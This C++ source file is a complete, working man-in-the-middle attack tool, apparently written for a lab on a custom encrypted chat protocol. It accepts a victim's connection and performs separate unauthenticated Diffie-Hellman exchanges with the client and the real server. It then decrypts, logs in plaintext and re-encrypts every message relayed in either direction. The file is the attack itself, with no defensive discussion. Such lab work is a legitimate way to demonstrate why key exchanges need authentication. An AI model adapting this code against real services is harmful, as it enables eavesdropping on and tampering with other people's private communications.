#include <arpa/inet.h>
#include <cerrno>
#include <cctype>
#include <cstdint>
#include <cstdlib>
#include <iostream>
#include <netinet/in.h>
#include <poll.h>
#include <string>
#include <sys/socket.h>
#include <unistd.h>

#include "key_exchange.h"
#include "secure_channel.h"
#include "socket_io.h"

namespace {

bool parse_port(const char *text, std::uint16_t &port) {
  char *end = nullptr;
  const long value = std::strtol(text, &end, 10);
  if (end == text || *end != '\0' || value < 1 || value > 65535)
    return false;
  port = static_cast<std::uint16_t>(value);
  return true;
}

int connect_to_server(const std::string &ip, std::uint16_t port) {
  const int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd == -1)
    return -1;

  sockaddr_in address{};
  address.sin_family = AF_INET;
  address.sin_port = htons(port);
  if (inet_pton(AF_INET, ip.c_str(), &address.sin_addr) != 1 ||
      connect(fd, reinterpret_cast<sockaddr *>(&address), sizeof(address)) ==
          -1) {
    close(fd);
    return -1;
  }
  return fd;
}

int create_listener(const std::string &ip, std::uint16_t port) {
  const int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd == -1)
    return -1;

  int reuse_address = 1;
  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse_address,
             sizeof(reuse_address));

  sockaddr_in address{};
  address.sin_family = AF_INET;
  address.sin_port = htons(port);
  if (inet_pton(AF_INET, ip.c_str(), &address.sin_addr) != 1 ||
      bind(fd, reinterpret_cast<sockaddr *>(&address), sizeof(address)) == -1 ||
      listen(fd, 10) == -1) {
    close(fd);
    return -1;
  }
  return fd;
}

bool exchange_as_server(int victim_fd, SessionKey &victim_key) {
  Message victim_public_message(MessageType::DH_PUBLIC_KEY, "");
  if (!receive_message(victim_fd, victim_public_message) ||
      victim_public_message.type() != MessageType::DH_PUBLIC_KEY)
    return false;

  try {
    const Number victim_public =
        dh_decode_public_key(victim_public_message.payload_as_string());
    const DhKeyPair mallory_keys = dh_generate_key_pair();
    if (!send_message(victim_fd,
                      Message(MessageType::DH_PUBLIC_KEY,
                              dh_encode_public_key(
                                  mallory_keys.public_key))))
      return false;

    const Number shared_secret =
        dh_shared_secret(victim_public, mallory_keys.private_key);
    return derive_session_key(shared_secret, victim_key);
  } catch (const std::exception &error) {
    std::cerr << "[MITM] victim-side DH failed: " << error.what() << '\n';
    return false;
  }
}

bool exchange_as_client(int server_fd, SessionKey &server_key) {
  try {
    const DhKeyPair mallory_keys = dh_generate_key_pair();
    if (!send_message(server_fd,
                      Message(MessageType::DH_PUBLIC_KEY,
                              dh_encode_public_key(
                                  mallory_keys.public_key))))
      return false;

    Message server_public_message(MessageType::DH_PUBLIC_KEY, "");
    if (!receive_message(server_fd, server_public_message) ||
        server_public_message.type() != MessageType::DH_PUBLIC_KEY)
      return false;

    const Number server_public =
        dh_decode_public_key(server_public_message.payload_as_string());
    const Number shared_secret =
        dh_shared_secret(server_public, mallory_keys.private_key);
    return derive_session_key(shared_secret, server_key);
  } catch (const std::exception &error) {
    std::cerr << "[MITM] server-side DH failed: " << error.what() << '\n';
    return false;
  }
}

const char *message_type_name(MessageType type) {
  switch (type) {
  case MessageType::CLIENT_HELLO:
    return "CLIENT_HELLO";
  case MessageType::SERVER_RESPONSE:
    return "SERVER_RESPONSE";
  case MessageType::CHAT_MESSAGE:
    return "CHAT_MESSAGE";
  case MessageType::LOGIN_ACCEPTED:
    return "LOGIN_ACCEPTED";
  case MessageType::LOGIN_REJECTED:
    return "LOGIN_REJECTED";
  case MessageType::DIRECT_MESSAGE:
    return "DIRECT_MESSAGE";
  case MessageType::WHO_REQUEST:
    return "WHO_REQUEST";
  case MessageType::WHO_RESPONSE:
    return "WHO_RESPONSE";
  case MessageType::SERVER_ERROR:
    return "SERVER_ERROR";
  case MessageType::DH_PUBLIC_KEY:
    return "DH_PUBLIC_KEY";
  case MessageType::ENCRYPTED_MESSAGE:
    return "ENCRYPTED_MESSAGE";
  case MessageType::COUNT:
    break;
  }
  return "UNKNOWN";
}

std::string escaped_payload(const Message &message) {
  const std::string payload = message.payload_as_string();
  std::string escaped;
  for (unsigned char byte : payload) {
    if (byte == '\n')
      escaped += "\\n";
    else if (byte == '\r')
      escaped += "\\r";
    else if (byte == '\t')
      escaped += "\\t";
    else if (std::isprint(byte))
      escaped += static_cast<char>(byte);
    else
      escaped += '?';
  }
  return escaped;
}

bool relay_one(int source_fd, const SessionKey &source_key, int destination_fd,
               const SessionKey &destination_key, const char *direction) {
  Message plaintext(MessageType::SERVER_ERROR, "");
  if (!receive_secure_message(source_fd, plaintext, source_key))
    return false;

  std::cout << "[PLAINTEXT " << direction << "] "
            << message_type_name(plaintext.type()) << " payload=\""
            << escaped_payload(plaintext) << "\"" << std::endl;
  return send_secure_message(destination_fd, plaintext, destination_key);
}

void relay_connection(int victim_fd, int server_fd,
                      const SessionKey &victim_key,
                      const SessionKey &server_key) {
  pollfd sockets[2] = {{victim_fd, POLLIN, 0}, {server_fd, POLLIN, 0}};
  while (true) {
    const int result = poll(sockets, 2, -1);
    if (result < 0 && errno == EINTR)
      continue;
    if (result <= 0)
      return;

    if ((sockets[0].revents & POLLIN) &&
        !relay_one(victim_fd, victim_key, server_fd, server_key,
                   "client -> server"))
      return;
    if ((sockets[1].revents & POLLIN) &&
        !relay_one(server_fd, server_key, victim_fd, victim_key,
                   "server -> client"))
      return;
    if ((sockets[0].revents | sockets[1].revents) &
        (POLLERR | POLLHUP | POLLNVAL))
      return;
  }
}

} // namespace

int main(int argc, char *argv[]) {
  if (argc != 5) {
    std::cerr << "Usage: " << argv[0]
              << " <listen-ip> <listen-port> <server-ip> <server-port>\n";
    return 1;
  }

  const std::string listen_ip = argv[1];
  const std::string server_ip = argv[3];
  std::uint16_t listen_port = 0;
  std::uint16_t server_port = 0;
  if (!parse_port(argv[2], listen_port) ||
      !parse_port(argv[4], server_port)) {
    std::cerr << "invalid port\n";
    return 1;
  }

  const int listener = create_listener(listen_ip, listen_port);
  if (listener == -1) {
    std::cerr << "could not start MITM listener\n";
    return 1;
  }
  std::cout << "[MITM] listening on " << listen_ip << ':' << listen_port
            << ", forwarding to " << server_ip << ':' << server_port << '\n';

  while (true) {
    const int victim_fd = accept(listener, nullptr, nullptr);
    if (victim_fd == -1)
      continue;

    const int server_fd = connect_to_server(server_ip, server_port);
    if (server_fd == -1) {
      std::cerr << "[MITM] could not connect to real server\n";
      close(victim_fd);
      continue;
    }

    SessionKey victim_key{};
    SessionKey server_key{};
    if (exchange_as_server(victim_fd, victim_key) &&
        exchange_as_client(server_fd, server_key)) {
      std::cout << "[MITM] established two independent secure channels\n";
      relay_connection(victim_fd, server_fd, victim_key, server_key);
    } else {
      std::cerr << "[MITM] key exchange failed\n";
    }

    shutdown(victim_fd, SHUT_RDWR);
    shutdown(server_fd, SHUT_RDWR);
    close(victim_fd);
    close(server_fd);
    std::cout << "[MITM] connection closed\n";
  }
}

